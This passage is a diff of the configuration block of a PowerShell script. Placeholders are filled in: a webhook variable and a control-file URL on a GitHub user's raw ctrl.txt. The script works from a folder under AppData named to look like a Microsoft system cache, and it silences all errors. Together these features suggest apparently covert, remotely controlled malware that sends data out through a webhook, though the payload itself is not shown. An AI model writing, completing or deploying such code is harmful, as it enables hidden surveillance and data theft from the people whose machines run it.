@@ -4,8 +4,8 @@ $ErrorActionPreference = 'SilentlyContinue'
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
 # ================= CONFIG =================
-$Wh   = "ВСТАВЬ_ССЫЛКУ_ВЕБХУКА"
-$Ctrl = "https://raw.githubusercontent.com/ВСТАВЬ_СВОЙ_НИК/flip/main/ctrl.txt"
+$Wh   = ""
+$Ctrl = "https://raw.githubusercontent.com/Ivory0309/flip/main/ctrl.txt"
 # ==========================================
 
 $Root  = "$env:APPDATA\Microsoft\Windows\SysCache"
